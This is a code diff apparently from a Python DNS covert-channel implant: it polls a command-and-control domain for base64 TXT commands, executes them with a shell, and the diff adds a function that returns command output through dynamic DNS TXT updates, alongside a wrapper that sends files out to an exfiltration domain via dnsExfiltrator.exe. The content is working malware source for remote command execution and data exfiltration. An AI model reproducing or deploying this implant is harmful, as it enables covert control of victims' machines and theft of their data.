@@ -1,5 +1,6 @@
 # stored in /opt/covert_channel for system service to be executed
 import dns.resolver
+import dns.update
 import base64
 import subprocess
 import time
@@ -9,22 +10,46 @@ POLL_TIME = 10
 
 # Define server and domain
 dns_server = "192.168.243.141"
-domain = "c2.netres.com"
-exfil_domain = "exfil.netres.com"
-subdomains = ['message']
+domain = "c2.netres.com."
+response_record = "response.c2.netres.com."
+exfil_domain = "exfil.netres.com."
+subdomains = ['command']
 
 exfil_encrypt_password = 'password'
+
+
+def update_response_record(msg: str):
+    # for now, just shorten it
+    msg = msg[:186]
+
+    encoded_msg = base64.b64encode(msg.encode('utf-8')).decode('utf-8')
+
+    update = dns.update.Update(domain)
+    update.delete(response_record, 'TXT')
+
+    # split into multiple if too long
+    # if len(encoded_msg) > 255:
+    #     chunks = [f'"{encoded_msg[i:i+255]}"' for i in range(0, len(encoded_msg), 255)]
+    #     update.add(response_record, 60, 'TXT', *chunks)
+    # else:
+    #     update.add(response_record, 60, 'TXT', encoded_msg)
+
+    update.add(response_record, 60, 'TXT', encoded_msg)
+
+    response = dns.query.tcp(update, dns_server)
+    return response
+
 
 def decode_message(encoded_message):
     """
     Decode the Base64 encoded message.
     """
-    print(encoded_message)
     try:
         return base64.b64decode(encoded_message).decode()
     except Exception as e:
         print(f"Error decoding message: {e}")
         return None
+
 
 def execute_command(command):
     """
@@ -38,13 +63,16 @@ def execute_command(command):
             args_list = command.split()
             command = f'.\\dnsExfiltrator.exe {args_list[1]} {exfil_domain} {exfil_encrypt_password} -b32 s={dns_server}'
 
-        result = subprocess.run(command, shell=True, text=True, capture_output=True)
+        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         if result.returncode == 0:
-            print(f"Command executed successfully:\n{result.stdout}")
+            print(f"Command executed successfully:\n{result.stdout.strip()}")
+            update_response_record(result.stdout.strip())
         else:
             print(f"Error executing command:\n{result.stderr}")
+            update_response_record('ERROR')
     except Exception as e:
         print(f"Error while executing the command: {e}")
+
 
 def get_covert_messages():
     """
@@ -86,7 +114,6 @@ def poll_server():
 
         # for right now, only really expecting there to be one
         for command in commands:
-            print(f'Got the following from the server: "{command}"')
             if not command:
                 continue
             execute_command(command)
@@ -97,4 +124,4 @@ def poll_server():
 
 if __name__ == '__main__':
     poll_server()
-    get_covert_messages()
+
